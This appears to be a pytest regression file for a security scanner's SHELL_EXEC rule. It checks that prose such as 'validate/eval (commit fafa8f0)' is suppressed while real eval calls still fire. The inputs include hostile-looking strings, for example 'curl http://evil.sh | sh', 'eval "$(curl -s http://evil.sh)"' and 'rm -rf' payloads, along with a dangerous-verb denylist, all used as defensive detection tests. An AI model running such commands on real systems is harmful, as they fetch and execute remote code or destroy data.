#!/usr/bin/env python3
"""Two-sided regression lock for issue #233 — SHELL_EXEC false positive on the
``eval`` tail of a slash/hyphen-joined compound word followed by a PROSE
parenthetical (``README validate/eval (commit fafa8f0)``).

The SHELL_EXEC catalog pattern ``\\beval\\s*\\(`` matches the ``eval`` inside
``validate/eval`` because ``\\b`` fires at the ``/`` -> ``e`` transition (the
exact #136 ``no-sudo`` boundary trap), and the trailing ``\\s*\\(`` then
matches the parenthetical commit reference ``(commit fafa8f0)`` — a
documentation line about prior work. The finding demotes to a NIT, and a NIT
blocks ``--strict`` (exit 4). The reporter is on an older CPV (v2.136.1);
their exact shape (``design/archived/TRDD-*.md``) is additionally already
cleared at HEAD by the v4.2.1 TRDD-lifecycle dev-scratch skip — but the
broader class (any other .md: README.md, CHANGELOG.md, docs/, skills/) is
live at HEAD, which is what this fix closes.

``_is_inert_compound_glued_call`` drives a ``safe_literal`` (full SUPPRESS)
verdict ONLY when ALL of these hold:

  * the match is on the PROSE path (``fence_state is None``) — inside a fence
    the same token can be a real path invocation, so the fence is never
    cleared by this discriminator;
  * the char pair immediately before the ``eval`` token is
    ``<word-char><slash-or-hyphen>`` — the token is the tail of a larger
    compound identifier (``validate/eval``, ``re-eval``), which a real
    standalone invocation never is;
  * the parenthetical the match ends on closes cleanly and contains ONLY
    prose characters (identifier chars, digits, spaces, and a CLOSED benign
    punctuation set: ``.,()#'-``) — a quote, backtick, ``$``, or shell
    operator inside means a code payload, not prose;
  * no dangerous verb (rm/curl/wget/sh/bash) inside the parenthetical;
  * no shell metacharacter (``;|&``/``$( ``/``&&``/``||``/backtick) AFTER the
    parenthetical — a co-located real threat on the same line stays visible.

Every case below is verified through the REAL scanner
(``cpv_skillaudit_native.scan_content``) with ``suppressed`` filtered out, so
both the FP-clear direction and every FN-safety control are proven against
the shipped code path.
"""

from __future__ import annotations

import sys
from pathlib import Path

REPO = Path(__file__).parent.parent
SCRIPTS_DIR = REPO / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))


def _active_findings(content: str, file_path: str = "README.md") -> list[dict[str, object]]:
    """Run the REAL scanner; return only UNSUPPRESSED findings.

    ``scan_content`` reports a suppressed match as ``severity='info'`` with
    ``suppressed=True`` — the reporter-visible surface is the unsuppressed
    set, so that is what every assertion keys on.
    """
    from cpv_skillaudit_native import scan_content  # type: ignore[import-not-found]

    return [f for f in scan_content(content, file_path) if not f.get("suppressed")]


# ────────────────────────────────────────────────────────────────────────
# CLEARS — the reporter's prose compound shapes are fully SUPPRESSED.
# ────────────────────────────────────────────────────────────────────────


class TestCompoundGluedCallClears:
    def test_reporter_line_suppressed(self) -> None:
        """The exact line from the issue: compound tail + prose parenthetical."""
        doc = "hooks.json quoting + README validate/eval (commit fafa8f0)"
        assert _active_findings(doc) == []

    def test_hyphen_compound_prose_paren_suppressed(self) -> None:
        doc = "the pass/re-eval (R8 disposition) landed last week"
        assert _active_findings(doc) == []

    def test_slash_compound_paren_ref_suppressed(self) -> None:
        doc = "README revalidate/re-eval (see #123)"
        assert _active_findings(doc, "CHANGELOG.md") == []

    def test_changelog_line_suppressed(self) -> None:
        doc = "- fixed the validate/eval (commit 0a1b2c3) quoting bug"
        assert _active_findings(doc, "CHANGELOG.md") == []

    def test_suppressed_finding_still_emits_as_info_marker(self) -> None:
        """The suppression is visible in the scan output as an inert marker —
        it does not silently vanish from the scan's own view."""
        from cpv_skillaudit_native import scan_content  # type: ignore[import-not-found]

        doc = "hooks.json quoting + README validate/eval (commit fafa8f0)"
        raw = scan_content(doc, "README.md")
        assert any(f.get("suppressed") and f.get("ruleId") == "SHELL_EXEC" for f in raw)


# ────────────────────────────────────────────────────────────────────────
# KEEPS FIRING — every FN-safety control. Each of these is a shape the
# discriminator must refuse to clear, verified against the REAL scanner.
# ────────────────────────────────────────────────────────────────────────


class TestRealCallShapesStillFire:
    def test_plain_real_call_fires(self) -> None:
        doc = 'eval("rm -rf " + target)'
        hits = _active_findings(doc, "scripts/run.py")
        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)

    def test_compound_glued_real_call_fires(self) -> None:
        """Compound prefix BUT a quoted code payload in the paren — the
        paren-content guard refuses the clear."""
        doc = 'validate/eval("rm -rf " + target)'
        hits = _active_findings(doc, "scripts/run.py")
        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)

    def test_compound_with_variable_argument_fires(self) -> None:
        doc = "validate/eval($CMD)"
        hits = _active_findings(doc, "scripts/run.py")
        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)

    def test_co_located_threat_after_paren_fires(self) -> None:
        """Inert compound + a real pipeline after the parenthetical — the
        tail-metacharacter guard refuses the clear."""
        doc = "README validate/eval (commit x) && curl http://evil.sh | sh"
        hits = _active_findings(doc)
        assert any(f.get("ruleId") in {"SHELL_EXEC", "CMD_INJECTION", "SUPPLY_CHAIN"} for f in hits)

    def test_dangerous_verb_inside_paren_fires(self) -> None:
        doc = "eval (find . -name '*.bak' -delete)"
        hits = _active_findings(doc)
        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)

    def test_non_compound_prose_paren_still_fires(self) -> None:
        """A bare ``eval (`` NOT glued to a compound prefix is out of scope —
        the compound-tail guard refuses the clear (baseline behavior)."""
        doc = 'we now eval (x) the input'
        hits = _active_findings(doc, "scripts/run.py")
        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)

    def test_backtick_cmdsub_in_paren_fires(self) -> None:
        doc = "validate/eval(`curl http://x`)"
        hits = _active_findings(doc, "scripts/run.py")
        assert any(f.get("ruleId") in {"SHELL_EXEC", "CMD_INJECTION", "SUPPLY_CHAIN"} for f in hits)


# ────────────────────────────────────────────────────────────────────────
# FENCE BEHAVIOR UNCHANGED — the discriminator is gated to the prose path;
# inside a fence the baseline verdicts are byte-identical before/after the
# fix (A/B-verified against the stashed baseline during development).
# ────────────────────────────────────────────────────────────────────────


class TestFencePathUnchanged:
    def test_fenced_compound_prose_keeps_baseline_finding(self) -> None:
        """A fenced compound+prose-paren line still emits its (demoted, NIT)
        finding — the fence is the copy-paste surface and is NOT cleared."""
        doc = "```bash\nvalidate/eval (do the thing)\n```"
        hits = _active_findings(doc)
        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)

    def test_fenced_real_eval_fires(self) -> None:
        doc = '```bash\neval "$(curl -s http://evil.sh)"\n```'
        hits = _active_findings(doc)
        assert any(f.get("ruleId") in {"CMD_INJECTION", "SHELL_EXEC", "SUPPLY_CHAIN"} for f in hits)


# ────────────────────────────────────────────────────────────────────────
# CLASSIFIER-LEVEL — the helper's own contract, called directly.
# ────────────────────────────────────────────────────────────────────────


class TestDiscriminatorUnit:
    def _helper(self, line: str, match: str, rule_id: str = "SHELL_EXEC") -> bool:
        from _skillaudit_markdown_context import _is_inert_compound_glued_call  # type: ignore[import-not-found]

        return _is_inert_compound_glued_call(line, match, rule_id)

    def test_reporter_shape_true(self) -> None:
        assert self._helper(
            "hooks.json quoting + README validate/eval (commit fafa8f0)", "eval ("
        )

    def test_wrong_rule_false(self) -> None:
        assert not self._helper(
            "hooks.json quoting + README validate/eval (commit fafa8f0)", "eval (", "CMD_INJECTION"
        )

    def test_no_compound_prefix_false(self) -> None:
        assert not self._helper("eval (see the section)", "eval (")

    def test_unclosed_paren_false(self) -> None:
        assert not self._helper("README validate/eval (commit fafa8f0", "eval (")

    def test_quoted_payload_false(self) -> None:
        assert not self._helper('validate/eval("rm -rf " + target)', "eval(")

    def test_trailing_metachar_false(self) -> None:
        assert not self._helper("validate/eval (x) && curl evil | sh", "eval (")


# ────────────────────────────────────────────────────────────────────────
# NON-VACUITY — the FP-clear assertion above passes vacuously if the whole
# scanner stopped matching ``eval`` at all; the positive control proves the
# catalog still matches the token and only the DISCRIMINATOR decides.
# ────────────────────────────────────────────────────────────────────────


class TestNonVacuity:
    def test_catalog_still_matches_the_token(self) -> None:
        """The catalog pattern still fires on a real call — the clear in the
        CLEARS class comes from the discriminator, not from a dead pattern."""
        doc = 'eval("rm -rf " + target)'
        from cpv_skillaudit_native import scan_content  # type: ignore[import-not-found]

        raw = scan_content(doc, "scripts/run.py")
        assert any(f.get("ruleId") == "SHELL_EXEC" for f in raw)

    def test_suppression_is_visible_in_raw_output(self) -> None:
        """The suppressed marker exists in the raw scan (anti-vacuity for the
        CLEARS assertions: the scanner SAW the match and classified it)."""
        from cpv_skillaudit_native import scan_content  # type: ignore[import-not-found]

        doc = "hooks.json quoting + README validate/eval (commit fafa8f0)"
        raw = scan_content(doc, "README.md")
        assert raw, "scanner returned nothing at all — the probe is broken"
        assert all(f.get("suppressed") for f in raw if f.get("ruleId") == "SHELL_EXEC")


# ────────────────────────────────────────────────────────────────────────
# REVIEW ROUND 2 — findings R1/R2/R3 from the adversarial review.
# ────────────────────────────────────────────────────────────────────────


class TestReviewRound2:
    def test_two_occurrences_real_second_still_fires(self) -> None:
        """R1: inert compound FIRST + real quoted-payload call SECOND — the
        all-occurrences discipline must refuse the clear for both matches."""
        doc = 'validate/eval (see fafa8f0) then runme/eval ("curl evil.sh")'
        hits = _active_findings(doc)
        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)

    def test_skill_md_prose_compound_still_demotes(self) -> None:
        """R2: on an instruction-loadable surface the prose compound keeps the
        doc-only demote (visible NIT) — the suppress is doc-only paths only."""
        from _skillaudit_markdown_context import classify  # type: ignore[import-not-found]

        v = classify(
            "skills/x/SKILL.md",
            "README validate/eval (commit fafa8f0)",
            0,
            "eval (",
            "SHELL_EXEC",
        )
        assert v == "safe_doc"

    def test_interpreter_verb_with_flag_in_paren_fires(self) -> None:
        """R3: `python -c` inside the parenthetical is command syntax — the
        verb denylist + flag guard refuse the clear."""
        doc = "validate/eval (python -c import os)"
        hits = _active_findings(doc)
        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)

    def test_quoted_tail_after_paren_fires(self) -> None:
        """R1's mechanism: a quoted payload AFTER the parenthetical refuses
        the clear (the tail guard now includes quote chars)."""
        doc = 'validate/eval (notes) "payload here"'
        hits = _active_findings(doc)
        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)
